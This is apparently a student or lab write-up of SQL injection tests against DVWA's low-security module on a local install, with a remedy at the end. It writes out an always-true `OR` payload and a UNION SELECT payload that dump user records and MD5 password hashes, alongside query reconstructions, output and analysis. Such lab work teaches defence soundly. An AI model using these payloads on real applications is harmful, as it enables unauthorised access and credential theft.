# SQL Injection — Payload Log & Analysis

Target: DVWA, SQL Injection module, Security Level: **Low**
Environment: Local LAMP install (Apache + MySQL 8.4 + PHP), Ubuntu

---

## Test 1 — Baseline (Control)

**Input:**
```
1
```

**Query executed (inferred):**
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1';
```

**Output:**
```
ID: 1
First name: admin
Surname: admin
```

**Analysis:** Expected behaviour — exactly one row returned, matching
the single requested user ID. This confirms the form works correctly
under normal, non-malicious input before any injection is attempted.

---

## Test 2 — Payload: `1' OR '1'='1`

**Input:**
```
1' OR '1'='1
```

**Query executed (inferred):**
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
```

**Output:**
```
ID: 1' OR '1'='1
First name: admin       Surname: admin
First name: Gordon      Surname: Brown
First name: Hack        Surname: Me
First name: Pablo       Surname: Picasso
First name: Bob         Surname: Smith
```

**Analysis:** The injected `OR '1'='1'` condition is always true,
so the `WHERE` clause matches every row in the `users` table instead
of just `user_id = 1`. All 5 users were returned. This demonstrates
that the application does not validate, escape, or parameterise the
`id` input before using it in a SQL query — a single unescaped quote
was enough to break out of the intended string literal and inject
arbitrary logic.

**Severity:** High. In a real login-bypass context, this exact
technique (`' OR '1'='1`) is commonly used to bypass authentication
checks entirely, since a query like
`WHERE username='$u' AND password='$p'` would also always evaluate
true.

---

## Test 3 — Payload: `1' UNION SELECT user, password FROM users#`

**Input:**
```
1' UNION SELECT user, password FROM users#
```

**Query executed (inferred):**
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1'
UNION SELECT user, password FROM users#';
```

**Output:**
```
ID: 1' UNION SELECT user, password FROM users#
First name: admin      Surname: admin
First name: admin      Surname: 5f4dcc3b5aa765d61d8327deb882cf99
First name: gordonb    Surname: e99a18c428cb38d5f260853678922e03
First name: 1337       Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
First name: pablo      Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
First name: smithy     Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

**Analysis:** `UNION SELECT` appends a second, fully attacker-defined
query onto the original one. Because both queries return exactly two
columns, the results line up cleanly into the page's existing
"First name" / "Surname" display fields — meaning the attacker doesn't
even need the application to have a dedicated place to show stolen
data; it gets rendered through the app's own existing output fields.
This extracted every username and password hash in the `users` table.

**Syntax issue encountered:** The initial attempt used the standard
`-- ` (double-dash + space) SQL comment syntax to neutralise the rest
of the original query. This caused a `500 Internal Server Error` /
MySQL syntax error, because the trailing space after `--` — which
MySQL requires for it to be parsed as a valid comment — was being
silently stripped when the payload was submitted through the form/URL.
Switching to `#` (which MySQL also treats as a comment, with no space
requirement) resolved this immediately.

**Severity:** Critical. This isn't just a logic bypass — it's a full
data exfiltration of every credential in the users table, achieved
through a single input field with a mildly malformed URL for the only
real obstacle.

**Additional finding:** The extracted hashes are 32-character
hexadecimal strings, consistent with **MD5**. MD5 is unsalted and
fast to compute, making it practical to reverse via precomputed
rainbow tables for common passwords. Notably, `admin` and `smithy`
share the identical hash `5f4dcc3b5aa765d61d8327deb882cf99`
(this is the MD5 hash of the string `password`), meaning both accounts
use the same weak, guessable password — a fact that becomes
immediately visible once the hashes are exposed side by side.

---

## Summary

| # | Payload | Result | Severity |
|---|---|---|---|
| 1 | `1' OR '1'='1` | Dumped all 5 user records | High |
| 2 | `1' UNION SELECT user, password FROM users#` | Dumped all usernames + MD5 password hashes | Critical |

**Root cause (both payloads):** User input is concatenated directly
into a SQL query string with no escaping, parameterisation, or input
validation.

**Fix:** Use parameterised queries / prepared statements everywhere
user input touches a SQL query. See `README.md` section 7 for a code
example.
